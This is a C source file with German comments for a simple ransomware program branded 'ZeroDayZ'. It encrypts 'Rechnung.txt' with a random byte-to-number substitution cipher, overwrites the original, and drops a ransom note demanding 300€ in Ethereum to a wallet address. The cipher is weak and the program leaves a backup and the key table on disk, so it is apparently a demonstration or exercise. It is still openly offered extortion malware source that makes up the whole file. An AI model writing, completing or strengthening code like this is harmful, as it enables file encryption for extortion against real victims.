#include <stdio.h>
#include <wchar.h>
#include <locale.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define MAX_TEXT_SIZE 1024
#define ALPHABET_SIZE 256

// Banner anzeigen
int banner() {
    const char* banner[] = {
        "                                                                    ",
        ",-------.                     ,------.                   ,-------. ",
        "`--.   /  ,---. ,--.--. ,---. |  .-.  \\  ,--,--.,--. ,--.`--.   /  ",
        "  /   /  | .-. :|  .--'| .-. ||  |  \\  :' ,-.  | \\  '  /   /   ",
        " /   `--.\\   --.|  |   ' '-' '|  '--'  /\\ '-'  |  \\   '   /   `--. ",
        "`-------' `----'`--'    `---' `-------'  `--`--'.-'  /   `-------' ",
        "                                                `---'              "
    };

    int num_lines = sizeof(banner) / sizeof(banner[0]);
    for (int i = 0; i < num_lines; i++) {
        printf("%s\n", banner[i]);
    }
    return 0;
}

// Überprüfen, ob Datei existiert
int fileExists(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (file) {
        fclose(file);
        return 1;
    }
    return 0;
}

// Erstellt ein Erpressungsschreiben
int threat() {
    FILE *file = fopen("PayUp.txt", "w");
    if (file == NULL) {
        perror("Fehler beim Erstellen des Erpressungsschreibens");
        return 1;
    }
    fprintf(file, "Möchtest du deine Datei wieder entschlüsselt haben?\nSende 300€ in Etherium an:\n0x742d35Cc6634C0532925a3b844Bc454e4438f44e\nDanke für Ihre Zusammenarbeit!");
    fclose(file);
    return 0;
}

// Erstellt eine Substitutionstabelle
void generate_substitution_table(int sub_table[ALPHABET_SIZE], int rev_table[10000]) {
    int used_codes[10000] = {0};
    for (int i = 0; i < ALPHABET_SIZE; i++) {
        int code;
        do {
            code = 1000 + rand() % 9000;
        } while (used_codes[code]);

        sub_table[i] = code;
        rev_table[code] = i;
        used_codes[code] = 1;
    }
}

// Text verschlüsseln
void substitute_encrypt(const char *input, int sub_table[ALPHABET_SIZE], char *output) {
    char buffer[6];
    output[0] = '\0';
    for (size_t i = 0; i < strlen(input); i++) {
        sprintf(buffer, "%04d ", sub_table[(unsigned char)input[i]]);
        strcat(output, buffer);
    }
}

// Substitutionstabelle speichern
void save_substitution_table(int sub_table[ALPHABET_SIZE]) {
    FILE *table_file = fopen("substitution_table.txt", "w");
    if (table_file == NULL) {
        perror("Fehler beim Speichern der Substitutionstabelle");
        return;
    }
    for (int i = 0; i < ALPHABET_SIZE; i++) {
        fprintf(table_file, "%c (%3d) -> %04d\n", i, i, sub_table[i]);
    }
    fclose(table_file);
}

int main() {
    setlocale(LC_ALL, "");
    const char *filename = "Rechnung.txt";
    char text[MAX_TEXT_SIZE];
    int sub_table[ALPHABET_SIZE];
    int rev_table[10000];
    char encrypted[MAX_TEXT_SIZE * 5];
    srand(time(NULL));

    banner();

    if (fileExists(filename)) {
        printf("Die Datei '%s' existiert. Verschlüsselung wird gestartet", filename);
        for (int i = 0; i < 3; i++) {
            printf(".");
            fflush(stdout);
            sleep(1);
        }
        printf("\n");

        if (rename(filename, "Rechnung_backup.txt") != 0) {
            perror("Fehler beim Erstellen des Backups");
        }

        FILE *input_file = fopen("Rechnung_backup.txt", "rb");
        if (input_file == NULL) {
            perror("Fehler beim Öffnen der Datei");
            return 1;
        }

        size_t text_len = fread(text, sizeof(char), MAX_TEXT_SIZE - 1, input_file);
        fclose(input_file);
        text[text_len] = '\0';

        generate_substitution_table(sub_table, rev_table);
        save_substitution_table(sub_table);

        substitute_encrypt(text, sub_table, encrypted);

        FILE *enc_file = fopen(filename, "wb");
        if (enc_file == NULL) {
            perror("Fehler beim Speichern der verschlüsselten Datei");
            return 1;
        }
        fwrite(encrypted, sizeof(char), strlen(encrypted), enc_file);
        fclose(enc_file);

        threat();
        printf("Verschlüsselung abgeschlossen.\n");
    } else {
        printf("Die Datei '%s' wurde nicht gefunden.\n", filename);
    }

    return 0;
}
